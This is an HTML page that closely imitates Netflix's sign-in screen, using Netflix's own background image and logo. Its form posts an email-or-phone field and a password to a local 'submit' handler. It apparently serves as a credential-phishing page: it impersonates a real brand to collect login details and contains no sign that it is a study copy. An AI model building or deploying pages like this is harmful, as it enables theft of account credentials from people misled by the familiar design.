<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Watch TV Shows Online, Watch Movies Online</title>
    <style>
        :root {
            --netflix-red: #e50914;
            --netflix-dark: #141414;
            --netflix-gray: #737373;
            --netflix-light-gray: #b3b3b3;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: black;
            color: white;
            min-height: 100vh;
            position: relative;
        }

        .background-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: linear-gradient(to top, rgba(0, 0, 0, 0.8) 0, rgba(0, 0, 0, 0) 60%, rgba(0, 0, 0, 0.8) 100%), 
                            url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88b/a3873901-5b7c-46eb-b9fa-12fea5197bd3/IN-en-20240311-popsignuptwoweeks-perspective_alpha_website_large.jpg');
            background-size: cover;
            background-position: center;
            z-index: -1;
        }

        .navbar {
            padding: 20px 3%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 1;
        }

        .logo {
            height: 45px;
        }

        .login-container {
            width: 100%;
            max-width: 450px;
            background-color: rgba(0, 0, 0, 0.75);
            margin: 60px auto;
            padding: 60px 68px;
            border-radius: 4px;
        }

        h1 {
            color: white;
            font-size: 32px;
            margin-bottom: 28px;
        }

        .form-group {
            position: relative;
            margin-bottom: 16px;
        }

        .form-input {
            width: 100%;
            height: 50px;
            padding: 16px 20px;
            background: #333;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
        }

        .form-input:focus {
            background: #454545;
            outline: none;
        }

        .form-input::placeholder {
            color: var(--netflix-light-gray);
        }

        .login-button {
            width: 100%;
            background-color: var(--netflix-red);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 16px;
            font-size: 16px;
            font-weight: bold;
            margin: 24px 0 12px;
            cursor: pointer;
        }

        .login-button:hover {
            background-color: #f6121d;
        }

        .remember-help {
            display: flex;
            justify-content: space-between;
            color: var(--netflix-light-gray);
            font-size: 13px;
            margin-bottom: 16px;
        }

        .remember-me {
            display: flex;
            align-items: center;
        }

        .remember-me input {
            margin-right: 5px;
        }

        .new-to-netflix {
            color: var(--netflix-gray);
            margin-top: 16px;
        }

        .new-to-netflix a {
            color: white;
            text-decoration: none;
        }

        .new-to-netflix a:hover {
            text-decoration: underline;
        }

        .captcha {
            font-size: 13px;
            color: var(--netflix-gray);
            margin-top: 11px;
        }

        footer {
            background-color: rgba(0, 0, 0, 0.75);
            padding: 30px 15% 50px;
            margin-top: 90px;
        }

        .footer-content {
            max-width: 1000px;
            margin: 0 auto;
        }

        .footer-top {
            margin-bottom: 30px;
        }

        .footer-links {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
        }

        .footer-link {
            color: var(--netflix-gray);
            font-size: 13px;
            text-decoration: none;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 740px) {
            .background-image {
                background-image: none;
            }

            .navbar {
                padding: 20px 4%;
            }

            .login-container {
                padding: 60px 20px;
                max-width: 100%;
                margin-top: 0;
                background-color: black;
            }

            footer {
                padding: 20px 5%;
                border-top: 1px solid #737373;
            }

            .footer-links {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 500px) {
            .login-container {
                padding: 40px 20px;
            }
            
            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="background-image"></div>
    
    <nav class="navbar">
        <a href="#">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
        </a>
    </nav>

    <div class="login-container">
        <h1>Sign In</h1>
        <form action="submit" method="post">
            <div class="form-group">
                <input name="username" type="email" class="form-input" id="email" placeholder="Email or phone number" required>
            </div>
            <div class="form-group">
                <input name="password" type="password" class="form-input" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-button">Sign In</button>
            <div class="remember-help">
                <div class="remember-me">
                    <input type="checkbox" id="remember">
                    <label for="remember">Remember me</label>
                </div>
                <a href="#">Need help?</a>
            </div>
            <div class="new-to-netflix">
                New to Netflix? <a href="#">Sign up now</a>.
            </div>
            <div class="captcha">
                This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.
            </div>
        </form>
    </div>

    <footer>
        <div class="footer-content">
            <div class="footer-top">
                <p>Questions? Call 000-800-919-1694</p>
            </div>
            <div class="footer-links">
                <a href="#" class="footer-link">FAQ</a>
                <a href="#" class="footer-link">Help Center</a>
                <a href="#" class="footer-link">Terms of Use</a>
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Cookie Preferences</a>
                <a href="#" class="footer-link">Corporate Information</a>
            </div>
        </div>
    </footer>

</body>
</html>
